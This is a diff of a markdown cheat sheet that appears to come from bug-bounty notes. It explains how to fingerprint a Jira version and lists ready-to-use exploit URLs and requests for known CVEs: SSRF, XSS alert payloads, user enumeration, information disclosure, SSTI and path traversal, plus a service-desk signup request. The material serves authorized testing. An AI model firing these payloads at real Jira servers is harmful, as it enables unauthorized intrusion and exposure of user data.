@@ -1,48 +1,65 @@
-# Unauthenticated Jira CVEs
-1. CVE-2017-9506 (SSRF)
+# Jira Common Bugs
+
+## Introduction
+What would you do if you came across a website that uses Jira?
+
+## How to Detect
 ```
-https://<JIRA_URL>/plugins/servlet/oauth/users/icon-uri?consumerUri=<SSRF_PAYLOAD>
+https://example.com/secure/Dashboard.jspa
+https://example.com/login.jsp
 ```
-2. CVE-2018-20824 (XSS)
+
+1. Find the related CVE by checking jira version
+* How to find the jira version
+
+Try to request to `https://example.com/secure/Dashboard.jspa` and then check the source code. You will find this line `<meta name="ajs-version-number" content="8.20.9">` so 8.20.9 is the version jira. If you found outdated jira version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-8170/Atlassian-Jira.html)
+
+Some example CVE:
+
+- CVE-2017-9506 (SSRF)
 ```
-https://<JIRA_URL>/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+https://example.com/plugins/servlet/oauth/users/icon-uri?consumerUri=<SSRF_PAYLOAD>
 ```
-3. CVE-2019-8451 (SSRF)
+- CVE-2018-20824 (XSS)
 ```
-https://<JIRA_URL>/plugins/servlet/gadgets/makeRequest?url=https://<HOST_NAME>:1337@example.com
+https://example.com/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
 ```
-4. CVE-2019-8449 (User Information Disclosure)
+- CVE-2019-8451 (SSRF)
 ```
-https://<JIRA_URL>/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
+https://example.com/plugins/servlet/gadgets/makeRequest?url=https://<HOST_NAME>:1337@example.com
 ```
-5. CVE-2019-8442 (Sensitive Information Disclosure)
+- CVE-2019-8449 (User Information Disclosure)
 ```
-https://<JIRA_URL>/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+https://example.com/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
 ```
-6. CVE-2019-3403 (User Enumeration)
+- CVE-2019-8442 (Sensitive Information Disclosure)
 ```
-https://<JIRA_URL>/rest/api/2/user/picker?query=<USERNAME_HERE>
+https://example.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
 ```
-7. CVE-2020-14181 (User Enumeration)
+- CVE-2019-3403 (User Enumeration)
 ```
-https://<JIRA_URL>/secure/ViewUserHover.jspa?username=<USERNAME>
+https://example.com/rest/api/2/user/picker?query=<USERNAME_HERE>
 ```
-8. CVE-2020-14178 (Project Key Enumeration)
+- CVE-2020-14181 (User Enumeration)
 ```
-https://<JIRA_URL>/browse.<PROJECT_KEY>
+https://example.com/secure/ViewUserHover.jspa?username=<USERNAME>
 ```
-9. CVE-2020-14179 (Information Disclosure)
+- CVE-2020-14178 (Project Key Enumeration)
 ```
-https://<JIRA_URL>/secure/QueryComponent!Default.jspa
+https://example.com/browse.<PROJECT_KEY>
 ```
-10. CVE-2019-11581 (Template Injection)
+- CVE-2020-14179 (Information Disclosure)
 ```
-<JIRA_URL>/secure/ContactAdministrators!default.jspa
+https://example.com/secure/QueryComponent!Default.jspa
+```
+- CVE-2019-11581 (Template Injection)
+```
+example.com/secure/ContactAdministrators!default.jspa
 
 * Try the SSTI Payloads
 ```
 
-11.   CVE-2019-3396 (Path Traversal)
+- CVE-2019-3396 (Path Traversal)
 ```
 POST /rest/tinymce/1/macro/preview HTTP/1.1
 Host: {{Hostname}}
@@ -56,10 +73,19 @@ Connection: close
 
 *Try above request with the Jira target
 ```
-12.   CVE-2019-3402 (XSS)
+- CVE-2019-3402 (XSS)
 ```
-https://<JIRA_URL>/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
+https://example.com/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
 ```
 
-Reference:
-- https://twitter.com/harshbothra
+2. Signup enabled
+```
+POST /servicedesk/customer/user/signup HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"email":"test@gmail.com","signUpContext":{},"secondaryEmail":"","usingNewUi":true}
+```
+
+## Reference
+* [@harshbothra](https://twitter.com/harshbothra)
